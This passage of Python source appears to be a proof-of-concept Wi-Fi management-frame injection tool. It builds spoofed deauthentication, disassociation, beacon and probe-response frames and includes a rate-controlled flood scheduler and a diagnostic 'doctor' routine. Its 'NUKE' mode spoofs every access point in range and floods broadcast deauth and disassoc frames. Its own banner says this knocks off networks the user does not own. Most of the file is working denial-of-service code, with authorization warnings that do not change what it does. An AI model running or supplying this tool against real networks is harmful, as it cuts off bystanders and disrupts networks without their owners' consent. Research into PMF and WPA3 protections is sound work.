        s = eff_ssid(tgt.ssid, ctx.assoc_ssid)
        body = "000000000000000064000401" + ssid_ies(s)
        if t == "ap":
            return (('beacon spoof (BSSID=SA=%s SSID="%s")' % (m, s)),
                    fr("8000", BC, m, m, body))
        return (("probe-resp spoof -> bcast BSSID=%s" % ap),
                fr("5000", BC, m, ap, body))
    if mode == 12:
        return ("custom frame", ctx.custom_hex)
    # fallback mirrors the old *) -> wildcard deauth/disassoc
    return ("deauth BCAST from AP (SA=%s DA=bcast)" % m,
            fr("c000", BC, m, m, "0700"))


def locked_target(st):
    return Target(st.lock_mac, st.lock_type, st.lock_freq, st.lock_lbl, st.lock_ssid)


def atk_ctx(st, cli="", custom_hex=""):
    return Ctx(ap_ctx=st.ap_ctx, assoc_ssid=st.ssid, fake=st.fake,
               cli=cli, custom_hex=custom_hex)


def do_attack(st, mode):
    n = ask_frames(st)
    cli, hx = "", ""
    if mode in (2, 4) and st.lock_type == "ap":
        cli = ask_client(st)
    if mode == 12:
        hx = ask_hex()
        if not hx:
            return
    label, hexframe = build_frame(mode, locked_target(st), atk_ctx(st, cli, hx))
    fire(st, label, hexframe, n, st.lock_freq)


def atk_verify(st):
    print("  --- end-to-end state ---")
    link = run(["iw", "dev", st.cfg.iface, "link"], timeout=10).splitlines()
    print("  link: %s" % (link[0].strip() if link else "<none>"))
    m = re.search(r"inet\s+(\S+)",
                  run(["ip", "-o", "-4", "addr", "show", st.cfg.iface], timeout=10))
    print("  addr: %s" % (m.group(1) if m else "<none (unassociated or no DHCP)>"))
    if m:
        gw = ""
        for line in run(["ip", "route", "show", "table", "all"], timeout=10).splitlines():
            if "default" in line and ("dev %s" % st.cfg.iface) in line:
                parts = line.split()
                if "via" in parts:
                    gw = parts[parts.index("via") + 1]
                break
        gw = gw or "192.168.1.1"
        # -I: root falls in Tailscale's uidrange rule -> LAN dests route via tun;
        # binding the oif beats the uid rule (see wifi-modem-seams.md).
        ok = subprocess.run(["ping", "-c2", "-W2", "-I", st.cfg.iface, gw],
                            capture_output=True, timeout=10).returncode == 0
        print("  gw ping (%s): %s" % (gw, "OK" if ok else "FAIL"))
    neigh = [l for l in run(["ip", "-4", "neigh", "show"], timeout=10).splitlines()
             if st.lock_mac in l.lower()]
    print("  target neigh: %s" % (neigh[0] if neigh else "(no live entry)"))
    cmac = colon_mac(st.lock_mac)
    dump = run(["iw", "dev", st.cfg.iface, "scan", "dump"], timeout=30)
    seen = ""
    lines = dump.splitlines()
    for i, l in enumerate(lines):
        if l.startswith("BSS %s" % cmac):
            for l2 in lines[i:i + 4]:
                if "last seen" in l2:
                    seen = l2.strip()
                    break
            break
    print("  target BSS: %s" % (seen or "not in scan cache"))


# --------------------------------------------------------------------------
# scheduler engine — deadline-paced rotation over the spoof set
# --------------------------------------------------------------------------
class KeyPoll:
    """Single-key poll with deadline; cbreak on a tty, line-based on pipes."""

    def __init__(self):
        self.fd = sys.stdin.fileno()
        self.is_tty = HAVE_TERMIOS and sys.stdin.isatty()
        self._old = None
        if self.is_tty:
            try:
                self._old = termios.tcgetattr(self.fd)
                tty.setcbreak(self.fd)
            except Exception:
                self._old = None
                self.is_tty = False

    def close(self):
        if self._old is not None:
            try:
                termios.tcsetattr(self.fd, termios.TCSADRAIN, self._old)
            except Exception:
                pass
            self._old = None

    def poll(self, timeout):
        """Wait up to timeout seconds for one key; '' = none. Never raises."""
        try:
            r, _, _ = select.select([self.fd], [], [], max(0.0, timeout))
        except Exception:
            return ""
        if not r:
            return ""
        try:
            if self.is_tty:
                return sys.stdin.read(1) or ""
            line = sys.stdin.readline()
            line = (line or "").strip()
            return line[0] if line else ""
        except Exception:
            return ""


def bld_nuke(st, idx, tgt, tog):
    if tog == 0:
        return fr("c000", BC, tgt.mac, tgt.mac, "0700")
    return fr("a000", BC, tgt.mac, tgt.mac, "0800")


def bld_sched(st, idx, tgt, tog):
    _, hexframe = build_frame(st.sched_mode, tgt,
                              Ctx(ap_ctx=st.ap_ctx, assoc_ssid=st.ssid,
                                  fake=st.fake, cli=st.sched_cli or st.fake,
                                  custom_hex=st.sched_hex))
    return hexframe


def sched_run(st, budget, pps, title, builder):
    pps = max(MIN_PPS, min(MAX_PPS, int(pps or DEFAULT_PPS)))
    step_us = max(1, 1000000 // pps)
    print("  [sched] %s -- %d target(s), budget=%s, target %d pps"
          % (title, len(st.spoof), budget if budget else "inf", pps))
    if not st.spoof:
        print("  [sched] nothing to send (empty spoof set)")
        return {"sent": 0, "ok": 0, "avg": 0}
    hint = "+=up -=dn q=quit" if budget else "+=up -=dn s=rescan q=quit"
    kp = KeyPoll()
    sent = ok = idx = tog = 0
    win_sent = secs = 0
    now = time.monotonic_ns()
    t0 = nxt = win = now
    try:
        while budget == 0 or sent < budget:
            n = len(st.spoof)
            if n == 0:
                print("  [sched] spoof set emptied mid-run — stopping")
                break
            idx %= n
            tgt = st.spoof[idx]
            tog ^= 1
            hexframe = builder(st, idx, tgt, tog)
            if st.cfg.dry:
                accepted = True
            else:
                accepted, _ = st.inj.send(st.cfg.iface, tgt.freq, hexframe, fast=True)
            if accepted:
                ok += 1
            sent += 1
            nxt += step_us * 1000
            now = time.monotonic_ns()
            if nxt > now:
                key = kp.poll((nxt - now) / 1e9)
                if key in ("+", "="):
                    pps = min(MAX_PPS, pps + 10)
                    step_us = max(1, 1000000 // pps)
                    print("  [sched] target -> %d pps" % pps)
                elif key in ("-", "_"):
                    pps = max(MIN_PPS, pps - 10)
                    step_us = max(1, 1000000 // pps)
                    print("  [sched] target -> %d pps" % pps)
                elif key in ("s", "S"):
                    if budget == 0 and st.sched_scope == "nuke" and nuke_refresh(st):
                        print("  [sched] rescan -> %d target(s), %d station(s)"
                              % (len(st.spoof), count_stations(st)))
                        idx = 0
                    else:
                        print("  [sched] rescan N/A in this burst (finite target set)")
                elif key in ("q", "Q"):
                    break
            else:
                nxt = now  # overrun: resync so a slow frame cannot spiral
            now = time.monotonic_ns()
            if now - win >= 1000000000:
                dt = now - win
                actual = ((sent - win_sent) * 1000000000 // dt) if sent > win_sent else 0
                stxt = ""
                if st.sched_scope == "nuke":
                    stxt = " . stations %d" % count_stations(st)
                print("  [sched] %d target(s)%s . target %d pps actual %d pps "
                      ". sent %d (ok %d) . %s"
                      % (len(st.spoof), stxt, pps, actual, sent, ok, hint))
                win, win_sent = now, sent
                secs += 1
                if (budget == 0 and st.sched_scope == "nuke" and secs >= 30
                        and nuke_refresh(st)):
                    print("  [sched] 30s refresh -> %d target(s), %d station(s)"
                          % (len(st.spoof), count_stations(st)))
                    idx = 0
                    secs = 0
    except KeyboardInterrupt:
        print()
        print("  [sched] SIGINT -- %d frames" % sent)
        raise SystemExit(130)
    finally:
        kp.close()
    dt = time.monotonic_ns() - t0
    avg = (sent * 1000000000 // dt) if dt > 0 else 0
    print("  [sched] done -- %d frames (%d accepted) over %ds, avg %d pps, %d target(s)"
          % (sent, ok, dt // 1000000000, avg, len(st.spoof)))
    return {"sent": sent, "ok": ok, "avg": avg}


def count_stations(st):
    return sum(1 for t in st.targets if t.typ == "station")


def sched_menu_burst(st, atk=1, frames=0, pps=0):
    try:
        atk = int(atk)
    except (TypeError, ValueError):
        atk = 0
    if atk < 1 or atk > 12:
        print("  ? attack# must be 1..12")
        return
    if not st.spoof:
        print("  ? no multi-target set loaded")
        return
    if not frames:
        frames = ask_frames(st, default=0) or 0
        while not frames:
            print("  ? frames must be a positive number")
            frames = ask_frames(st, default=0) or 0
    else:
        try:
            frames = int(frames)
        except (TypeError, ValueError):
            frames = 0
        if frames <= 0:
            print("  ? frames must be a positive number")
            return
    if not pps:
        while True:
            try:
                s = inp("  target pps [%s]: " % st.cfg.pps)
            except EOFExit:
                s = ""
            s = (s or "").strip() or str(st.cfg.pps)
            if s.isdigit() and int(s) > 0:
                pps = int(s)
                break
            print("  ? pps must be a positive number")
    else:
        try:
            pps = int(pps)
        except (TypeError, ValueError):
            pps = 0
        if pps <= 0:
            print("  ? pps must be a positive number")
            return
    st.sched_mode = atk
    if atk in (2, 4) and any(t.typ == "ap" for t in st.spoof):
        try:
            cli = inp("  directed client MAC [%s]: " % st.fake)
        except EOFExit:
            cli = ""
        cli = (cli or "").strip() or st.fake
        while not norm_mac(cli):
            print("  ? not a valid MAC (need 12 hex digits)")
            try:
                cli = inp("  directed client MAC [%s]: " % st.fake)
            except EOFExit:
                cli = ""
            cli = (cli or "").strip() or st.fake
        st.sched_cli = norm_mac(cli)
    if atk == 12:
        st.sched_hex = ask_hex()
        if not st.sched_hex:
            return
    st.sched_scope = "menu"
    sched_run(st, frames, pps, "targeted attack #%d scheduled burst" % atk, bld_sched)


# --------------------------------------------------------------------------
# NUKE mode
# --------------------------------------------------------------------------
def nuke_build(st):
    """Build the spoof set per NUKE_SCOPE. Commits only on success (keeps the
    previous set when the cache is empty — the old script cleared first)."""
    scope = st.cfg.scope
    new = []
    if scope == "all":
        for t in st.targets:
            if t.typ != "ap":
                continue
            f = t.freq or (int(st.freq) if str(st.freq).isdigit() else DEFAULT_FREQ)
            new.append(Target(t.mac, "ap", f, t.label, t.ssid))
        if st.ap_bssid and not new:
            f = int(st.freq) if str(st.freq).isdigit() else DEFAULT_FREQ
            new.append(Target(st.ap_bssid, "ap", f, "associated AP", ""))
    elif scope == "own":
        if st.ap_bssid:
            f = int(st.freq) if str(st.freq).isdigit() else DEFAULT_FREQ
            new.append(Target(st.ap_bssid, "ap", f, "associated AP", ""))
    else:
        m = norm_mac(scope)
        if m:
            f = int(st.freq) if str(st.freq).isdigit() else DEFAULT_FREQ
            new.append(Target(m, "ap", f, "scope MAC", ""))
    if not new:
        return False
    sort_spoof_set(new)
    st.spoof = new
    return True


def nuke_refresh(st):
    """Live rescan (no arping — cheap). False = keep previous set."""
    own_state(st)
    saved = list(st.targets)
    st.targets = []
    dump = run(["iw", "dev", st.cfg.iface, "scan", "dump"], timeout=30)
    for (mac, freq, sig, ssid) in parse_bss_dump(dump):
        try:
            f = int(freq or 0)
        except ValueError:
            f = 0
        add_tgt(st.targets, st.own, mac, "ap", f,
                'AP "%s" %sdBm' % (ssid or "<hidden>", sig or "?"), ssid)
    if st.cfg.fixture:
        try:
            with open(st.cfg.fixture, errors="replace") as f:
                text = f.read()
        except OSError:
            text = ""
        for (mac, freq, sig, ssid) in parse_bss_dump(text):
            try:
                f = int(freq or 0)
            except ValueError:
                f = 0
            add_tgt(st.targets, st.own, mac, "ap", f,
                    'AP "%s" %sdBm' % (ssid or "<hidden>", sig or "?"), ssid)
    if st.assoc:
        for line in run(["ip", "-4", "neigh", "show", "dev", st.cfg.iface],
                        timeout=10).splitlines():
            toks = line.split()
            if "lladdr" not in toks:
                continue
            mac = toks[toks.index("lladdr") + 1] if toks.index("lladdr") + 1 < len(toks) else ""
            if mac:
                add_tgt(st.targets, st.own, mac, "station",
                        st.freq or 0, "neighbor %s [%s]" % (toks[0], toks[-1]))
    if not nuke_build(st):
        st.targets = saved  # restore: never leave an empty set behind
        return False
    return True


def nuke_listing(st):
    print()
    print("  === NUKE target set (scope=%s) ===" % st.cfg.scope)
    print("  -- APs detected (spoof candidates) --")
    naps = nstn = 0
    for t in st.targets:
        if t.typ != "ap":
            continue
        naps += 1
        print("     %s freq=%-5s %s" % (t.mac, t.freq, t.label))
    print("  -- stations detected --")
    for t in st.targets:
        if t.typ != "station":
            continue
        nstn += 1
        print("     %s %s" % (t.mac, t.label))
    if nstn == 0:
        print("     (none in arp/peer cache)")
    print("  spoof set: %d BSSID(s) -> wildcard deauth+disassoc" % len(st.spoof))


def nuke_countdown():
    print("  firing in 3s at %s pps (q=abort; +/- or =/_ adjust target while live, s=rescan): "
          % _pps_hint, end="", flush=True)
    kp = KeyPoll()
    try:
        key = kp.poll(3.0)
    finally:
        kp.close()
    if key in ("q", "Q"):
        print()
        print("  [NUKE] aborted.")
        sys.exit(0)
    print()


_pps_hint = DEFAULT_PPS


def nuke_mode(st, budget=0):
    global _pps_hint
    _pps_hint = st.cfg.pps
    mode_txt = ("bounded %d-frame promiscuous deauth/disassoc burst" % budget
                if budget > 0 else "persistent promiscuous deauth/disassoc flood")
    print("======================================================================")
    print("  N U K E   M O D E  -- %s" % mode_txt)
    print("======================================================================")
    print("  Spoofs every detected AP and fires wildcard FF:FF:FF:FF:FF deauth +")
    print("  disassoc %s." % ("for %d frames" % budget if budget > 0
                              else "until killed (q / Ctrl-C)"))
    print("  ALL stations in range of any spoofed BSSID are forced off --")
    print("  including networks you do NOT own. Purposely NOT safe. Authorized")
    print("  research only (impact/CVSS evidence and the WPA3/802.11w-PMF need case).")
    print("======================================================================")
    detect(st)
    if not nuke_build(st):
        print("  no APs usable as spoof targets (empty scan cache).")
        sys.exit(1)
    nuke_listing(st)
    try:
        nuke_countdown()
    except KeyboardInterrupt:
        print()
        print("  [NUKE] aborted during countdown.")
        sys.exit(130)
    st.sched_scope = "nuke"
    sched_run(st, budget, st.cfg.pps,
              "NUKE %s" % ("burst (%d frames)" % budget if budget > 0
                           else "perpetual flood"),
              bld_nuke)
    print("  [NUKE] nuke ended.")
    sys.exit(0)


# --------------------------------------------------------------------------
# doctor — driver/tool readiness + (opt-in) observable TX-effect proof
# --------------------------------------------------------------------------
# Why this exists: injection "not working" is almost never the driver — the
# acceptance path (host cfg80211 + firmware TX completion) can be perfect while
# nothing observable happens, because a single radio cannot watch its own
# spoofed frames take effect (no second victim/sniffer in the loop). Doctor
# separates the layers: host state -> acceptance -> on-air effect, and says
# which one actually failed.
PATCHED_SCM = "g8c63b58fa7c2-dirty"  # known patched cfg80211 build marker


def _read_file(path):
    try:
        with open(path, errors="replace") as f:
            return f.read().strip()
    except OSError:
        return ""


def _link_status(iface):
    """(connected, bssid_colonless, freq). Never raises."""
    try:
        out = run(["iw", "dev", iface, "link"], timeout=10)
    except Exception:
        return False, "", ""
    m = re.search(r"Connected to ([0-9a-fA-F:]+)", out)
    if not m:
        return False, "", ""
    f = re.search(r"freq:\s*(\d+)", out)
    return True, norm_mac(m.group(1)), (f.group(1) if f else "")


def _rsn_info(dump, bssid_colon):
    """Parse the RSN block of one BSS section -> (akms, caps_int|None)."""
    in_sec, in_rsn = False, False
    akms, caps = "", None
    for line in (dump or "").splitlines():
        if line.startswith("BSS "):
            if in_sec:
                break
            if line[4:4 + 17].lower() == bssid_colon.lower():
                in_sec = True
            continue
        if not in_sec:
            continue
        s = line.strip()
        if s.startswith("RSN:"):
            in_rsn = True
            continue
        if in_rsn:
            if s.startswith("* Authentication suites:"):
                akms = s.split(":", 1)[1].strip()
            m = re.match(r"\*\s+Capabilities:.*\((0x[0-9a-fA-F]+)\)", s)
            if m:
                try:
                    caps = int(m.group(1), 16)
                except ValueError:
                    caps = None
                break
    return akms, caps


def doctor_run(st, allow_disruptive=False):
    print("==================================================================")
    print(" DOCTOR — wifi driver / tool / TX-effect readiness")
    print("==================================================================")
    fails, warns = [], []
    iface = st.cfg.iface

    # 1) privilege + interface
    print("[1] euid=%d  iface=%s" % (os.geteuid(), iface))
    if os.geteuid() != 0:
        fails.append("not root (need CAP_NET_ADMIN)")
    addr = _read_file("/sys/class/net/%s/address" % iface)
    oper = _read_file("/sys/class/net/%s/operstate" % iface)
    print("    mac=%s operstate=%s" % (addr or "?", oper or "?"))
    if not addr:
        fails.append("interface %s missing" % iface)

    # 2) association state
    own_state(st)
    print("[2] link: %s" % ("associated bssid=%s freq=%s ssid=\"%s\""
                            % (st.ap_bssid, st.freq, st.ssid) if st.assoc
                            else "UNassociated (station mode)"))
    if not st.assoc:
        warns.append("unassociated: self-deauth proof N/A; injection still works")

    # 3) cfg80211 build marker (indicator only — functional test decides)
    scm = _read_file("/sys/module/cfg80211/scmversion")
    print("[3] cfg80211 scmversion=%s" % (scm or "?"))
    if scm == PATCHED_SCM:
        print("    patched build marker present")
    elif scm:
        print("    not the known patched marker (functional test below decides)")

    # 4) tool probe (already located)
    print("[4] tool: %s" % st.cfg.tool)

    # 5) harmless acceptance probes (vendor-action + spoofed-SA public-action;
    #    inert frames no peer reacts to — non-disruptive by construction)
    freq = int(st.freq) if str(st.freq).isdigit() else DEFAULT_FREQ
    inert = fr("d000", BC, "021122334455", "021122334455",
               "7fdeadbeef" + binascii.hexlify(b"INJECTTEST").decode())
    a, _ = st.inj.send(iface, freq, inert)
    print("[5] harmless vendor-action TX: %s" % ("accepted" if a else "REJECTED"))
    if not a:
        fails.append("baseline TX rejected (driver/tool/path broken)")
    spoof = fr("d000", BC, "021122334455", "aabbccddeeff", "0400")
    b, _ = st.inj.send(iface, freq, spoof)
    print("    spoofed-SA public-action TX: %s%s" % (
        "accepted (patch live)" if b else "REJECTED (stock cfg80211 SA gate?)",
        "" if b else ""))
    if not b:
        warns.append("spoofed SA rejected — stock cfg80211 likely in effect")

    # 6) target AP protection (explains whether spoofed deauth COULD work)
    if st.assoc and st.ap_bssid:
        dump = run(["iw", "dev", iface, "scan", "dump"], timeout=30)
        akms, caps = _rsn_info(dump, colon_mac(st.ap_bssid))
        pmf = "unknown (not in scan cache)"
        if caps is not None:
            if caps & 0x40:
                pmf = "REQUIRED (MFPR) — spoofed deauth ineffective by design (WPA3/PMF win)"
            elif caps & 0x80:
                pmf = "capable, not required (MFPC)"
            else:
                pmf = "none — spoofed deauth effective in principle"
        print("[6] AP RSN: akm=[%s] caps=%s PMF: %s"
              % (akms or "?", ("0x%04x" % caps) if caps is not None else "?", pmf))
        if caps is not None and (caps & 0x40):
            warns.append("target enforces PMF: use this as the WPA3 need-case, not a failure")
    else:
        print("[6] AP RSN: skipped (unassociated)")

    # 7) observability: who could witness an effect?
    neigh = [l for l in run(["ip", "-4", "neigh", "show", "dev", iface],
                            timeout=10).splitlines() if l.strip()]
    live = [l for l in neigh if "FAILED" not in l]
    print("[7] neighbors on %s: %d entr(ies), %d live" % (iface, len(neigh), len(live)))
    for l in live[:6]:
        print("    %s" % l)
    print("    note: this radio cannot observe its own spoofed frames take effect —")
    print("    visible proof needs a second victim on the BSS or an external sniffer.")

    # verdict (non-disruptive part)
    print("---")
    if fails:
        print("DOCTOR: FAIL — %s" % "; ".join(fails))
        return 1
    # 8) opt-in observable proof: one unicast self-deauth, watch blip+reconnect
    if allow_disruptive:
        if st.cfg.dry:
            print("DOCTOR: disruptive proof refused under --dry (no TX).")
            return 1
        if not st.assoc or not st.own or not st.ap_bssid:
            print("DOCTOR: disruptive proof needs an associated link; skipping.")
            return 1
        print("[8] DISRUPTIVE proof: one unicast self-deauth (DA=AP SA=own).")
        print("    Expect: link drops for ~1-3s, then reconnects. Ctrl-C aborts.")
        try:
            for i in range(3, 0, -1):
                print("    firing in %d..." % i)
                time.sleep(1)
        except KeyboardInterrupt:
            print("    aborted.")
            return 2
        dframe = fr("c000", st.ap_bssid, st.own, st.ap_bssid, "0700")
        ok, _ = st.inj.send(iface, freq, dframe, fast=True)
        print("    sent: %s" % ("accepted" if ok else "REJECTED"))
        if not ok:
            print("DOCTOR: FAIL — self-deauth not even accepted")
            return 1
        t0 = time.monotonic()
        dropped, back = False, False
        while time.monotonic() - t0 < 8:
            c, _, _ = _link_status(iface)
            if not c:
                dropped = True
                break
            time.sleep(0.5)
        t1 = time.monotonic()
        while time.monotonic() - t1 < 25:
            c, _, _ = _link_status(iface)
            if c:
                back = True
                break
            time.sleep(1)
        dt = time.monotonic() - t0
        if dropped and back:
            print("DOCTOR: PROVEN — link dropped and reconnected in %.0fs "
                  "(TX path radiates; driver state good)" % dt)
        elif dropped:
            warns.append("link dropped but not yet reconnected — check link")
            print("DOCTOR: PARTIAL — dropped, reconnect pending (%.0fs)" % dt)
        else:
            fails.append("no disconnect observed — TX may not reach the air")
            print("DOCTOR: FAIL — sent but no effect (see note [7])")
            return 1
    if warns:
        print("DOCTOR: OK with notes — %s" % "; ".join(warns))
    else:
        print("DOCTOR: OK — driver, tool and acceptance path healthy")
    return 0


# --------------------------------------------------------------------------
# menus
# --------------------------------------------------------------------------
def attack_menu(st):
    while True:
        print()
        print(MENU_TEXT.format(mac=st.lock_mac, typ=st.lock_type,
                               freq=st.lock_freq, lbl=st.lock_lbl))
        try:
            c = inp(" choice: ")
        except EOFExit:
            print("bye.")
            sys.exit(0)
        tok = c.split()
        if tok[:1] == ["13"]:
            a = tok[1] if len(tok) > 1 else 1
            f = tok[2] if len(tok) > 2 else 0
            p = tok[3] if len(tok) > 3 else 0
            sched_menu_burst(st, a, f, p)
            continue
        if tok and re.match(r"^[0-9]+[sS]$", tok[0]):
            a = tok[0][:-1]
            f = tok[1] if len(tok) > 1 else 0
            p = tok[2] if len(tok) > 2 else 0
            sched_menu_burst(st, a, f, p)
            continue
        if c == "1":
            do_attack(st, 1)
        elif c == "2":
            do_attack(st, 2)
        elif c == "3":
            do_attack(st, 3)
        elif c == "4":
            do_attack(st, 4)
        elif c == "5":
            do_attack(st, 5)
        elif c == "6":
            do_attack(st, 6)
        elif c == "7":
            do_attack(st, 7)
        elif c == "8":
            do_attack(st, 8)
        elif c == "9":
            do_attack(st, 9)
        elif c == "10":
            do_attack(st, 10)
        elif c == "11":
            do_attack(st, 11)
        elif c == "12":
            do_attack(st, 12)
        elif c in ("A", "a"):
            print("  --- safe demo set ---")
            save = st.cfg.repeat
            st.cfg.repeat = 1
            for m in (5, 8, 9, 10):
                label, hexframe = build_frame(m, locked_target(st), atk_ctx(st))
                fire(st, label, hexframe, 1, st.lock_freq)
            st.cfg.repeat = save
        elif c in ("V", "v"):
            atk_verify(st)
        elif c in ("I", "i"):
            print(INFO_TEXT)
        elif c in ("R", "r"):
            return
        elif c in ("Q", "q"):
            print("bye.")
            sys.exit(0)
        else:
            print("  ?")


def main(argv=None):
    args = parse_args(argv)
    if args.self_test:
        run_self_test()
        return
    cfg = Config(args)
    ensure_root(cfg, sys.argv[1:])
    cfg.tool = locate_tool(cfg.tool_override)
    st = State(cfg, Injector(cfg.tool, cfg.no_daemon))
    try:
        atexit.register(st.inj.close)
    except Exception:
        pass
    if args.doctor or args.doctor_disruptive:
        try:
            rc = doctor_run(st, allow_disruptive=args.doctor_disruptive)
        except KeyboardInterrupt:
            print()
            print("aborted.")
            rc = 2
        sys.exit(rc)

    print("==================================================================")
    print(" OP12 cfg80211 mgmt-injection PoC (station mode, end-to-end)")
    print("==================================================================")
    print(" AUTHORIZED TESTING ONLY — networks/devices you own.")
    print(" Type NUKE [N] instead of YES for the destructive deauth demo (N = bounded frame count;")
    print(" omitted = persistent until killed). NOT safe. Scheduled bursts of any menu attack: option 13.")
    try:
        try:
            arm = inp(" Type YES to arm: ")
        except EOFExit:
            print("not armed.")
            return
        if arm != "YES":
            maybe_nuke(arm)  # raises NukeRequest if NUKE... (falls through otherwise)
            print("not armed.")
            return
        own_state(st)
        print(" own: %s mac=%s state=%s" % (
            cfg.iface, st.own,
            ("assoc bssid=%s freq=%s ssid=\"%s\"" % (st.ap_bssid, st.freq, st.ssid))
            if st.assoc else "unassociated (station mode)"))
        print(" tool: %s  fake-client=%s" % (cfg.tool, st.fake))
        while True:
            read_lock(st)
            attack_menu(st)
    except NukeRequest as r:
        nuke_mode(st, r.budget)
    except EOFExit:
        print("bye.")
    except KeyboardInterrupt:
        print()
        print("bye.")


# --------------------------------------------------------------------------
# built-in smoke tests (no hardware): --self-test
# --------------------------------------------------------------------------
def run_self_test():
    fails = []

    def check(name, cond):
        print(("PASS " if cond else "FAIL ") + name)
        if not cond:
            fails.append(name)

    # frame builders (vectors must match the bash implementation byte-for-byte)
    check("fr/deauth-bcast",
          fr("c000", BC, "aabbccddeeff", "aabbccddeeff", "0700") ==
          "c0000000ffffffffffffaabbccddeeffaabbccddeeff00000700")
    check("ssid_ies",
          ssid_ies("test_ap_1") == "0009" + binascii.hexlify(b"test_ap_1").decode()
          + "010882848b960c121824")
    # mac normalization
    check("norm_mac colon", norm_mac("AA:BB:CC:DD:EE:FF") == "aabbccddeeff")
    check("norm_mac bad", norm_mac("zz") == "")
    check("norm_mac short", norm_mac("aabbcc") == "")
    # bss parser
    sample = ("BSS aa:bb:cc:dd:ee:ff(on wlan0)\n\tfreq: 2412.0\n\tsignal: -50.00 dBm\n"
              "\tSSID: test_ap_1\n"
              "BSS 11:22:33:44:55:66\n\tfreq: 5745\n\tsignal: -60.00 dBm\n\tSSID: \n")
    recs = parse_bss_dump(sample)
    check("parse count", len(recs) == 2)
    check("parse paren-strip", recs[0][0] == "aa:bb:cc:dd:ee:ff")
    check("parse freq-.0", recs[0][1] == "2412")
    check("parse ssid", recs[0][3] == "test_ap_1")
    # matcher: glob default, ERE auto-detect, ~ force
    tgts = [Target("aabbccddeeff", "ap", 2412, "x", "test_ap_1"),
            Target("112233445566", "ap", 2412, "x", "test_ap_2"),
            Target("001122334455", "ap", 5745, "x", "The Mill Coffee")]
    check("match glob", match_ssids(tgts, "test_ap_*", False) == [1, 2])
    check("match glob space", match_ssids(tgts, "The Mill*", False) == [3])
    check("match ere", match_ssids(tgts, "^test_ap_", True) == [1, 2])
    p, f = split_pattern("Stest_ap_*")
    check("split glob", (p, f) == ("test_ap_*", False))
    p, f = split_pattern("S^OH")
    check("split auto-ere", (p, f) == ("^OH", True))
    p, f = split_pattern("S~^test_ap_[0-9]+$")
    check("split force-ere", (p, f) == ("^test_ap_[0-9]+$", True))

    class FakeCfg:
        dry = True
        iface = "wlan0"
        fire_delay = 0
        pps = 100
        fixture = ""
        scope = "all"

    class FakeInj:
        def send(self, *a, **k):
            return True, False

    st = State.__new__(State)
    st.cfg = FakeCfg()
    st.inj = FakeInj()
    st.targets = [Target("b00000000002", "ap", 5745, "b", "test_ap_2"),
                  Target("a00000000001", "ap", 2412, "a", "test_ap_1")]
    st.freq = ""
    st.own = ""
    st.ap_bssid = ""
    st.ssid = "assocssid"
    st.fake = "0a0000000000"
    st.ap_ctx = ""
    st.sched_mode = 1
    st.sched_cli = ""
    st.sched_hex = ""
    st.sched_scope = "menu"
    check("lock_select multi", lock_select(st, [1, 2, 2, 99, "x"]) is True)
    check("lock_select sorted", [t.mac for t in st.spoof] == ["a00000000001", "b00000000002"])
    check("lock first", st.lock_mac == "b00000000002")
    # all 12 builders produce sane frames
    ctx = Ctx(ap_ctx="", assoc_ssid="s", fake=st.fake)
    for m in range(1, 13):
        if m == 12:
            ctx.custom_hex = "d000" + "00" * 23
        try:
            lbl, hx = build_frame(m, st.targets[0], ctx)
            nb = len(binascii.unhexlify(hx))
            ok = MIN_FRAME_LEN <= nb <= MAX_FRAME_LEN and len(hx) % 2 == 0
        except Exception:
            ok = False
        check("build mode %d (%dB)" % (m, nb if 'nb' in dir() else -1), ok)
    # scheduler dry: exact budget accounting over the spoof set
    st.sched_mode = 1
    import io
    from contextlib import redirect_stdout
    buf = io.StringIO()
    with redirect_stdout(buf):
        summary = sched_run(st, 20, 200, "self-test burst", bld_sched)
    check("sched budget exact", summary["sent"] == 20 and summary["ok"] == 20)
    # nuke builder keeps previous set on empty cache
    st.targets = []
    st.spoof = [Target("a00000000001", "ap", 2412, "a", "x")]
    st.cfg.scope = "all"
    check("nuke_build empty fails", nuke_build(st) is False)
    check("nuke_build keeps set", len(st.spoof) == 1)
    # NUKE dispatch from arbitrary input (the old line-299 crash class)
    try:
        maybe_nuke("NUKE")
        check("nuke dispatch", False)
    except NukeRequest as r:
        check("nuke dispatch", r.budget == 0)
    try:
        maybe_nuke("nuke 500")
        check("nuke bounded", False)
    except NukeRequest as r:
        check("nuke bounded", r.budget == 500)
    try:
        maybe_nuke("5")
        check("nuke no-false-positive", True)
    except NukeRequest:
        check("nuke no-false-positive", False)

    print("---")
    if fails:
        print("SELF-TEST: %d FAILURES: %s" % (len(fails), fails))
        sys.exit(1)
    print("SELF-TEST: all pass")


if __name__ == "__main__":
    main()
